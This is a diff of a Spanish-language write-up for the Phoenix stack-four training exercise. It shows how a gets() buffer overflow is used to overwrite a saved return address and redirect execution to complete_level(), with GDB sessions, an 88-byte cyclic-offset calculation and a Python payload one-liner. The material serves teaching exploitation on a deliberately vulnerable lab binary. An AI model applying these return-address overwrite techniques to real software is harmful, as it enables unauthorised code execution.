@@ -14,12 +14,24 @@ tags: [PWN, Linux, Hacking, Easy]
 
 ![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)
 
-analiza lo que puede suceder cuando se sobrescribe el puntero de instrucción guardado (desbordamiento de búfer estándar).
+En este nivel se introduce el concepto de **sobrescritura del puntero de instrucción guardado** (saved return address) mediante un **desbordamiento de buffer estándar**.  
+El objetivo es modificar la dirección de retorno de la función `start_level()` para que apunte a `complete_level()` y así ejecutar la función de éxito.
 
 **Consejos:**
 
-- El puntero de instrucción guardado no necesariamente está directamente después del final de las asignaciones de variables: factores como el relleno del compilador pueden aumentar el tamaño. [¿Sabías que algunas arquitecturas pueden no guardar la dirección de retorno en la pila en todos los casos?](https://en.wikipedia.org/wiki/Link_register)
-- GDB admite “ejecutar < my_file” para dirigir la entrada desde my_file al programa.
+- El puntero de instrucción guardado no necesariamente se encuentra justo después de las variables locales: factores como el **relleno del compilador** pueden modificar su ubicación.  
+- Algunas arquitecturas pueden no guardar la dirección de retorno en la pila en todos los casos. Más info: [Link register](https://en.wikipedia.org/wiki/Link_register).  
+- GDB permite redirigir la entrada de un archivo con `run < my_file`
+
+## Análisis del código
+
+El programa contiene:
+
+- Un **buffer de 64 bytes** (`buffer`) donde se almacena la entrada del usuario.  
+- Uso de `gets()`, que permite escribir más allá del buffer y sobrescribir la pila.  
+- La función `complete_level()`, que imprime el mensaje de éxito y termina el programa.  
+
+
 
 ```c
 /*
@@ -78,7 +90,8 @@ int main(int argc, char **argv) {
 }
 ```
 
-vamos a depurar con gdb 0x000000000040061d  complete_level
+El reto consiste en sobrescribir la dirección de retorno de start_level() para redirigir la ejecución hacia complete_level().
+
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ gdb ./stack-four 
@@ -101,7 +114,7 @@ GEF for linux ready, type `gef' to start, `gef config' to configure
 71 commands loaded for GDB 8.2.1 using Python engine 3.5
 [*] 2 commands could not be loaded, run `gef missing` to know why.
 Reading symbols from ./stack-four...(no debugging symbols found)...done.
-gef➤  info fun
+gef➤  info func
 All defined functions:
 
 Non-debugging symbols:
@@ -125,7 +138,9 @@ Non-debugging symbols:
 gef➤ 
 ```
 
-ahora un fuzzing break en main y luego correr 
+**Determinación de offset con cyclic**
+
+Hacemos un breakpoint en main y ejecutamos el programa: para esto ejecutamos los comandos `break main` y luego el comando `r` para ejecutarlo
 
 ```c
 gef➤  break main
@@ -182,7 +197,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤ 
 ```
 
-c continuar
+Ejecutamos el comando `c` para continuar 
 
 ```c
 gef➤  c
@@ -190,7 +205,7 @@ Continuing.
 Welcome to phoenix/stack-four, brought to you by https://exploit.education
 ```
 
-luego pwn cyclic 100
+Enviamos un patrón cíclico de 100 bytes: con el comando `pwn cyclic 100` en nuestra máquina local
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix]
@@ -198,7 +213,7 @@ luego pwn cyclic 100
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 ```
 
-pegar 
+El resultado que nos da lo pegamos como la respuesta que está esperando el binario 
 
 ```c
 gef➤  c
@@ -249,7 +264,22 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤  
 ```
 
-ahora 
+con el comando `info frame` podemos ver el valor del rip que en este caso es  rip = 0x6161617861616177
+
+```c
+gef➤  info frame
+Stack level 0, frame at 0x7fffffffe648:
+ rip = 0x6161617861616177; saved rip = 0x61616179
+ called by frame at 0x7fffffffe650
+ Arglist at 0x7fffffffe638, args: 
+ Locals at 0x7fffffffe638, Previous frame's sp is 0x7fffffffe648
+ Saved registers:
+  rip at 0x7fffffffe640
+
+```
+
+
+Calculamos el offset donde se sobrescribe el saved return address con el valor que tenemos  
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix]
@@ -257,7 +287,9 @@ ahora
 88
 ```
 
-y ahora probar 
+El offset es 88 bytes, es decir, debemos enviar 88 bytes antes de la dirección de complete_level(). 
+
+enviamos el payload y la dirección de complet_level que vimos previamente  **0x000000000040061d  complete_level** pero en little-endian que sería \x1d\x06\x40 y con esto resolvemos el reto.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A" * 88 + "\x1d\x06\x40"' | ./stack-four 
@@ -266,7 +298,9 @@ and will be returning to 0x40061d
 Congratulations, you've finished phoenix/stack-four :-) Well done!
 ```
 
-ahora el exploit 
+**Exploit con Pwntools**
+
+Creamos un script en Python3 para automatizarlo:
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/4_stack-four]
@@ -303,7 +337,9 @@ ahora el exploit
 ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-ejecutar exploit
+**Resultado final**
+
+Se evidencia el mensaje que indica que el reto fue resuelto
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/4_stack-four]
@@ -326,3 +362,15 @@ ejecutar exploit
     and will be returning to 0x40061d
     **Congratulations, you've finished phoenix/stack-four :-) Well done!**
 ```
+
+**Conclusión**
+
+En este reto vimos cómo sobrescribir la dirección de retorno permite redirigir el flujo de ejecución del programa hacia una función deseada.
+
+Puntos clave:
+
+  - El uso de funciones inseguras como gets() facilita el buffer overflow.
+
+  - El saved return address es un objetivo clásico en explotación de la pila.
+
+  - Controlar el flujo mediante este puntero es una técnica fundamental en explotación binaria.
